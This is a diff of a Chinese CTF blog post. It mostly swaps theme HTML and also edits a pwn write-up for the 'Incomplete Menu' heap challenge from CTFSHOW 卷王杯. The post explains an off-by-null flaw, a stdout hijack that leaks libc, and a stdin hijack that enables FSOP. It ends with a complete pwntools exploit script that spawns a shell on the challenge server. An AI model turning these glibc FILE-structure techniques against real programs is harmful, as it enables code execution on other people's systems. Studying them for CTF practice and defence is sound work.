@@ -1,6 +1,224 @@
-<!doctype html>
-<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>CTFSHOW卷王杯-pwn - Y1secoのblog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Y1secoのblog"><meta name="msapplication-TileImage" content="./img/avatar1.jpeg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Y1secoのblog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="根据官方wp学习了两道好题"><meta property="og:type" content="blog"><meta property="og:title" content="Y1seco"><meta property="og:url" content="https://y1seco.github.io/"><meta property="og:site_name" content="Y1seco"><meta property="og:description" content="根据官方wp学习了两道好题"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://w.wallhaven.cc/full/o3/wallhaven-o3vyk5.jpg"><meta property="article:published_time" content="2022-02-27T14:53:54.034Z"><meta property="article:modified_time" content="2022-02-27T14:53:26.037Z"><meta property="article:author" content="Y1seco"><meta property="article:tag" content="pwn"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://w.wallhaven.cc/full/o3/wallhaven-o3vyk5.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://y1seco.github.io/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/"},"headline":"Y1secoのblog","image":["https://w.wallhaven.cc/full/o3/wallhaven-o3vyk5.jpg"],"datePublished":"2022-02-27T14:53:54.034Z","dateModified":"2022-02-27T14:53:26.037Z","author":{"@type":"Person","name":"y1seco"},"description":"根据官方wp学习了两道好题"}</script><link rel="canonical" href="https://y1seco.github.io/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/"><link rel="icon" href="/./img/avatar1.jpeg"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Y1secoのblog" type="application/atom+xml">
-</head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/./img/avatar1.jpeg" alt="Y1secoのblog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="https://w.wallhaven.cc/full/o3/wallhaven-o3vyk5.jpg" alt="CTFSHOW卷王杯-pwn"></span></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-02-27  <a class="commentCountImg" href="/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/#comment-container"><span class="display-none-class">b6846a5fad9dd2690cb52184d101b5b6</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="b6846a5fad9dd2690cb52184d101b5b6">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>22 m  <i class="fas fa-pencil-alt"> </i>3.2 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>&nbsp;visits</span></div></div><h1 class="title is-3 is-size-4-mobile">CTFSHOW卷王杯-pwn</h1><div class="content"><p>根据官方wp学习了两道好题</p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"y1seco.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.10.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="根据官方wp学习了两道好题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW卷王杯-pwn">
+<meta property="og:url" content="https://y1seco.github.io/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/index.html">
+<meta property="og:site_name" content="Y1secoのblog">
+<meta property="og:description" content="根据官方wp学习了两道好题">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-02-27T14:53:54.034Z">
+<meta property="article:modified_time" content="2022-02-27T15:36:59.645Z">
+<meta property="article:author" content="y1seco">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://y1seco.github.io/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://y1seco.github.io/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/","path":"2022/02/27/CTFSHOW卷王杯- Incomplete Menu/","title":"CTFSHOW卷王杯-pwn"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTFSHOW卷王杯-pwn | Y1secoのblog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Y1secoのblog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y1secoのblog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#check-in"><span class="nav-number">1.</span> <span class="nav-text">check in</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">1.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Incomplete-Menu"><span class="nav-number">2.</span> <span class="nav-text">Incomplete Menu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.2.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">2.3.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">y1seco</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://y1seco.github.io/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="y1seco">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y1secoのblog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTFSHOW卷王杯-pwn
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-02-27 22:53:54 / Modified: 23:36:59" itemprop="dateCreated datePublished" datetime="2022-02-27T22:53:54+08:00">2022-02-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>根据官方wp学习了两道好题</p>
 <span id="more"></span>
 
 <h1 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>发现开了<code>**sandbox**</code>（之后再仔细分析），然后读入姓名那里有一个明显的<strong>格式化字符串漏洞</strong>，再之后可以读入<code>0x90</code>大小的数据，然而数组大小只有<code>0x80</code>，很明显是一个<strong>栈溢出</strong>，但是溢出的长度非常短，只有<code>0x10</code>，也就是只能覆盖<code>rbp</code>和<code>ret</code>，在程序的最后有<code>close(1)</code><strong>关闭了标准输出的文件描述符</strong>，也就是我们无法泄露任何信息，包括最终得到的<code>flag</code>，最后再看下此题的保护：<strong>没有开</strong><code>**Canary**</code><strong>和</strong><code>**PIE**</code><strong>保护</strong>。</p>
@@ -14,111 +232,81 @@
 
 
 
-<h1 id="Incomplete-Menu"><a href="#Incomplete-Menu" class="headerlink" title="Incomplete Menu"></a>Incomplete Menu</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>一个菜单堆题，保护全开，由于考虑到是给<code>CTFshow</code>出的题目，所以是放在低版本<code>glibc</code>（<code>libc-2.27</code>）下的，其实这题开了沙盒并且放在高版本<code>glibc</code>下也是可以做的，可以思考一下。这题给出了一个不完整的菜单，只有<code>new</code>和<code>edit</code>，<code>new</code>就是新建一个<strong>任意大小（无限制）</strong>的堆块，最多只可以创建<code>5</code>个堆块，<code>edit</code>可以输入需要读进某堆块中内容的长度<code>len</code>，如果输入的长度<code>len</code>超过了该堆块的大小<code>size</code>，则实际读入长度<code>Len = size</code>，否则<code>Len = len</code>。漏洞点在于：在将读入内容的最后一字节改为<code>\x00</code>的时候，长度用的是用户输入的长度<code>len</code>，而并非实际读入的长度<code>Len</code>，<strong>这样就会导致某堆块后面的任意某字节会被“刷零”</strong>，不过每个堆块只能被<code>edit</code>一次。</p>
+<h1 id="Incomplete-Menu"><a href="#Incomplete-Menu" class="headerlink" title="Incomplete Menu"></a>Incomplete Menu</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>这题给出了一个不完整的菜单，只有<code>new</code>和<code>edit</code>，<code>new</code>就是新建一个<strong>任意大小（无限制）</strong>的堆块，最多只可以创建<code>5</code>个堆块，<code>edit</code>可以输入需要读进某堆块中内容的长度<code>len</code>，如果输入的长度<code>len</code>超过了该堆块的大小<code>size</code>，则实际读入长度<code>Len = size</code>，否则<code>Len = len</code>。漏洞点在于：在将读入内容的最后一字节改为<code>\x00</code>的时候，长度用的是用户输入的长度<code>len</code>，而并非实际读入的长度<code>Len</code>，<strong>这样就会导致某堆块后面的任意某字节会被“刷零”</strong>，不过每个堆块只能被<code>edit</code>一次。</p>
 <p>没有<code>show</code>，不能泄露信息，不过有走<code>IO</code>流输出的函数，如<code>puts</code>和<code>printf</code>，因此容易想到通过劫持<code>stdout</code>来进行信息泄露，没有<code>delete</code>函数，不能对堆块进行<code>free</code>，其实可以通过漏洞改<code>top chunk</code>的<code>size</code>，将它改小以后（要保证后三位不动），再申请一个大堆块，就能将原先的<code>top chunk</code>给<code>free</code>调了，不过在这里貌似并没有太大的用处。</p>
 <p>我们只有这一个可利用的漏洞，又需要劫持到<code>stdout</code>，那就需要知道<code>stdout</code>与堆块地址的偏移，对于一般的堆块，其地址与<code>libc</code>地址的偏移肯定是无法确定的，但是这题可以申请任意大的堆块，也就是可以通过<code>mmap</code>申请堆块，而<code>**mmap**</code><strong>申请出来的堆块，是紧接在</strong><code>**libc**</code><strong>的上方的，其地址与</strong><code>**libc**</code><strong>中地址的偏移是可以确定的</strong>，这里可以通过<strong>将</strong><code>**_IO_2_1_stdout_**</code><strong>的</strong><code>**_IO_read_end**</code><strong>和</strong><code>**_IO_write_base**</code><strong>的最后一字节都改为</strong><code>**\x00**</code><strong>，这样他们就相等了</strong>，也就可以通过走<code>IO</code>的输出函数泄露出其中（<code>_IO_write_base ~ _IO_write_ptr</code>）包含的<code>libc</code>地址，进而得到<code>libc_base</code>。</p>
 <p>泄露出<code>libc_base</code>之后，我们肯定是需要一个“任意写”漏洞，劫持一些函数或者<code>IO</code>流这些才能完成攻击。不难想到，可以通过劫持<code>stdin</code>来实现，这里我们按照和上面类似的方式，<strong>修改</strong><code>**_IO_2_1_stdin_**</code><strong>的</strong><code>**_IO_buf_base**</code><strong>中的最后一字节为</strong><code>**\x00**</code>，这时，<code>_IO_buf_base</code>正好指向了<code>_IO_2_1_stdin_</code>，而我们读入的时候，用的是<code>fgets</code>，这是一个走<code>IO</code>流的读入函数（这个函数就是读一整行到<code>stdin</code>缓冲区，然后再从缓冲区取出指定长度的数据，因此读数据会被<code>\n</code>截断，或者已经从缓冲区取到了所需长度的数据，也不再会刷新缓冲区往后读取数据了），因此，我们可以通过<code>fgets</code>读入任意内容到被伪造的<code>_IO_buf_base</code>（<code>_IO_2_1_stdin_</code>）处，这样就可以再劫持一次<code>stdin</code>进行任意写了，我们读入多少字节到缓冲区，<code>_IO_read_end</code>就会相应加多少，从缓冲区读取多少字节到目标内存，<code>_IO_read_ptr</code>就会相应加多少，不过，最多也只能一次性读入<code>_IO_buf_end - _IO_buf_base</code>大小的数据到缓冲区，如果还需要读入，则会刷新缓冲区，一次也最多只能读取<code>_IO_read_end - _IO_read_ptr</code>大小的合法数据到目标内存，此时，由于<code>_IO_buf_end</code>为<code>_IO_buf_base + 132</code>，因此，<strong>我们只有读满</strong><code>**132**</code><strong>个字节，才有机会按我们第一次劫持</strong><code>**stdin**</code><strong>后，读入到</strong><code>**_IO_buf_base**</code><strong>中的值（记为</strong><code>**_IO_buf_base(new)**</code><strong>）刷新缓冲区，只有刷新完缓冲区之后，才能按照我们的设想进行第二次</strong><code>**stdin**</code><strong>的劫持</strong>。这里需要注意的是，在第一次完成<code>stdin</code>的劫持，读入<code>132</code>字节的内容到<code>_IO_2_1_stdin_</code>中之后，会尝试从缓冲区取<code>16</code>个字节到目标内存，如果成功取出了<code>16</code>个字节，也就满足了<code>fgets</code>的需要，那么也就不会刷新缓冲区了，我们也就不能对<code>stdin</code>进行第二次劫持了。在这里，<code>glibc</code>是<strong>通过判断</strong><code>**_IO_read_ptr**</code><strong>是否小于</strong><code>**_IO_read_end**</code><strong>来判断缓冲区中是否还有剩余的数据</strong>，因此，我们可以在第一次劫持<code>stdin</code>往<code>_IO_2_1_stdin_</code>中写内容的时候，<strong>修改其中的</strong><code>**_IO_read_ptr**</code><strong>等于</strong><code>**_IO_read_end**</code>，这里的<code>_IO_read_end</code>是指读完<code>132</code>个字节后的值（<code>_IO_buf_base(new) + 132</code>），也就是需要<code>_IO_read_ptr = _IO_buf_base(new) + 132</code>，其实，这里也不一定是要加上<code>132</code>，略小一点，只要保证和<code>_IO_read_end</code>差值不足大约<code>16</code>个字节，可以有刷新缓冲区的机会即可，并且，<code>glibc</code>源码中也只是判断了<code>_IO_read_ptr</code>是否小于<code>_IO_read_end</code>，故还可以将<code>_IO_read_ptr</code>改为大于<code>_IO_read_end</code>，比如<code>_IO_read_ptr = _IO_buf_base(new) + 200</code>也行。在这里，我是通过<strong>劫持</strong><code>**IO_list_all**</code><strong>来打</strong><code>**FSOP**</code>的，通过读取<code>choice</code>的<code>fgets</code>进行“任意写”以后，由于获取到的值并非菜单中的选项<code>1</code>或<code>2</code>，就会走到<code>exit</code>，直接触发<code>FSOP</code>。</p>
 <h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28121</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_IO_str_jumps</span>():</span></span><br><span class="line">   IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">   IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">   <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">       possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">       <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">          <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, length, content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    io.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_x</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_x</span>(<span class="params">index, length, content</span>):</span></span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x200000</span>);</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x201000</span> - <span class="number">0x10</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x10</span> + <span class="number">1</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">new_x(<span class="number">0x200000</span>);</span><br><span class="line">edit_x(<span class="number">1</span>, <span class="number">0x201000</span> * <span class="number">2</span> - <span class="number">0x10</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x20</span> + <span class="number">1</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">libc_base = u64(io.recvline()[<span class="number">8</span>:<span class="number">16</span>]) - libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x38</span> <span class="comment"># _IO_stdfile_2_lock (_IO_2_1_stderr_.file._lock)</span></span><br><span class="line">success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + get_IO_str_jumps() - <span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">new(<span class="number">0x200000</span>);</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x201000</span> * <span class="number">3</span> - <span class="number">0x10</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x38</span> + <span class="number">1</span>, payload) <span class="comment"># _IO_buf_base</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xfbad208b</span>) <span class="comment"># _flags</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] + <span class="number">132</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]) * <span class="number">6</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] + <span class="number">0x10</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">132</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base - (<span class="number">0x201000</span> * <span class="number">3</span> - <span class="number">0x10</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://qgieod1s9b.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#">ctfshow卷王杯官方wp</a></p>
